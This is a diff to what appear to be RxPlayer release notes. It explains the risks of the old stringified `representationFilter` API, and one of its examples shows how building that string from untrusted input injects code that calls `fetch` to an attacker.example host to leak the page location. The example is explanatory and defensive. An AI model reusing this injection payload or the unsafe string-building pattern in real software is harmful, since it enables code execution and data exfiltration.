@@ -104,13 +104,48 @@ _TODO: Add a schema showing why a regular JavaScript function is not enough here
 
 We previously tried to work around that for `representationFilter` with a stringified function format. It made it explicit that this function would not be running under regular JavaScript assumptions, but it was not very pleasant to write nor to maintain and very easy to get wrong.
 
-_TODO: Add code and note for the previous `representationFilter` string API, to make clear why the previous solution was explicit but awkward._
+For example, to keep only video Representations up to 1080p, you previously had to provide the function as a string:
+
+```javascript
+rxPlayer.loadVideo({
+  url,
+  transport: "dash",
+  representationFilter: `function (representation, context) {
+    if (context.trackType !== "video") {
+      return true;
+    }
+    var width = representation.width;
+    var height = representation.height;
+    return width != null && height != null && width <= 1920 && height <= 1080;
+  }`,
+});
+```
+
+This was at least explicit: what is sent to the worker is JavaScript source code, not a normal function carrying its lexical environment with it. Yet it also meant losing syntax highlighting and type-checking in many setups, making escaping mistakes more likely, and having to write the callback as self-contained worker-compatible JavaScript instead of regular application code.
 
 With a partner application integrating us, we even ended up reviewing all changes to their `representationFilter` logic to make sure it complied with those rules, corresponded to their target JS (ES5-compatible) and did not open the door for security problems (e.g. interpreting an unvalidated input in that implementation).
 
-_TODO: Show what a very wrong `representationFilter` in terms of security could have been._
+An example for a very wrong version would have been to build that string from untrusted configuration and let it become executable code in the worker:
 
-We always wondered if that "string function" was the way to go which is why we only did so with the usually simpler `representationFilter` API - as a test. Now we propose a new solution that should be both more convenient and safer for application developers: they can build the RxPlayer worker themselves.
+```javascript
+const externalInput =
+  "true; fetch('https://attacker.example/collect?' + self.location.href);";
+
+rxPlayer.loadVideo({
+  url,
+  transport: "dash",
+  representationFilter: `function (representation, context) {
+    if (context.trackType !== "video") {
+      return true;
+    }
+    return ${externalInput};
+  }`,
+});
+```
+
+We always wondered if that "string function" was the way to go which is why we only did so with the usually simpler `representationFilter` API - as a test.
+
+Now we propose a new solution that should be both more convenient and safer for application developers: they can build the RxPlayer worker themselves:
 
 <img alt="RELEASE_NOTES_v4 5 0_two_application_bundles" src="https://github.com/user-attachments/assets/a0f1fb6b-c43f-4635-99b2-f0e8c6df2a25" />
 
